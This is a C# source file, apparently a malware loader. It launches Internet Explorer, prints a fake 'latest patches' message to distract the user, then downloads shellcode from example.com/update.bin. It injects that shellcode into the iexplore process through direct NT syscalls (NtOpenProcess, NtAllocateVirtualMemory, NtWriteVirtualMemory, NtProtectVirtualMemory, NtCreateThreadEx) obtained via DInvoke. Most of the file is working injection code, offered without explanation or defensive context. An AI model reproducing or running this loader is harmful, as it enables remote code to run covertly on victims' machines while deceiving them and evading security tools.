using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;
using Win32 = DInvoke.Data.Win32;
{
    if (Process.GetProcessesByName("iexplore").Length <= 0)
    {
        Process.Start("C:\\Program Files\\Internet Explorer\\iexplore.exe");
        await Task.Delay(3000);
        Console.Write("Please wait...Internet Explorer is initiating latest patches");
        await Task.Delay(3000);
        Console.Write("\n\nImportant, IE 11 is no longer supported, switch to Microsoft Edge as soon as possible. " +
                      "\nSee: https://learn.microsoft.com/en-us/lifecycle/announcements/internet-explorer-11-end-of-support");
        await Task.Delay(4000);
    }
    {
        byte[] shellcode;
        using (var client = new HttpClient())
        {
            shellcode = await client.GetByteArrayAsync("http://example.com/update.bin");
        }
        var target = Process.GetProcessesByName("iexplore")[0];
        Console.WriteLine("Target PID: {0}", target.Id);
        var hProcess = OpenProcess(target.Id);
        if (hProcess == IntPtr.Zero)
            Console.WriteLine("hProcess: 0x{0:X}", hProcess.ToInt64());
        var regionSize = (IntPtr)shellcode.Length;
        var hMemory = AllocateMemory(hProcess, regionSize);
        if (hMemory == IntPtr.Zero)
            throw new Exception("Failed to allocate memory");
        Console.WriteLine("hMemory: 0x{0:X}", hMemory.ToInt64());
        if (!WriteMemory(hProcess, hMemory, shellcode))
            throw new Exception("Failed to write memory");
        if (!ProtectMemory(hProcess, hMemory, regionSize))
            throw new Exception("Failed to change memory to RX");
        if (!CreateThread(hProcess, hMemory))
            throw new Exception("Failed to create thread");
        IntPtr OpenProcess(int pid)
        {
            var ptr = Generic.GetSyscallStub("NtOpenProcess");
            var ntOpenProcess =
                Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtOpenProcess)) as
                    Native.DELEGATES.NtOpenProcess;
            var oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
            var cid = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)pid
            };
            var hProcess = IntPtr.Zero;
            _ = ntOpenProcess(
                ref hProcess,
                Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref cid);
            return hProcess;
        }
        IntPtr AllocateMemory(IntPtr hProcess, IntPtr regionSize)
        {
            var ptr = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            var ntAllocateVirtualMemory =
                Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtAllocateVirtualMemory)) as
                    Native.DELEGATES.NtAllocateVirtualMemory;
            var hMemory = IntPtr.Zero;
            ntAllocateVirtualMemory(
                hProcess,
                ref hMemory,
                IntPtr.Zero,
                ref regionSize,
                Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE,
                Win32.WinNT.PAGE_READWRITE);
            return hMemory;
        }
        bool WriteMemory(IntPtr hProcess, IntPtr hMemory, byte[] shellcode)
        {
            var ptr = Generic.GetSyscallStub("NtWriteVirtualMemory");
            var ntWriteVirtualMemory =
                Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtWriteVirtualMemory)) as
                    Native.DELEGATES.NtWriteVirtualMemory;
            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            uint written = 0;
            var status = ntWriteVirtualMemory(
                hProcess,
                hMemory,
                buffer,
                (uint)shellcode.Length,
                ref written);
            return status == 0;
        }
        bool ProtectMemory(IntPtr hProcess, IntPtr hMemory, IntPtr regionSize)
        {
            var ptr = Generic.GetSyscallStub("NtProtectVirtualMemory");
            var ntProtectVirtualMemory =
                Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtProtectVirtualMemory)) as
                    Native.DELEGATES.NtProtectVirtualMemory;
            uint old = 0;
            var status = ntProtectVirtualMemory(
                hProcess,
                ref hMemory,
                ref regionSize,
                Win32.WinNT.PAGE_EXECUTE_READ,
                ref old);
            return status == 0;
        }
        bool CreateThread(IntPtr hProcess, IntPtr hMemory)
        {
            var ptr = Generic.GetSyscallStub("NtCreateThreadEx");
            var ntCreateThreadEx =
                Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtCreateThreadEx)) as
                    Native.DELEGATES.NtCreateThreadEx;
            var status = ntCreateThreadEx(
                out _,
                Win32.WinNT.ACCESS_MASK.GENERIC_ALL,
                IntPtr.Zero,
                hProcess,
                hMemory,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);
            return status == 0;
        }
    }
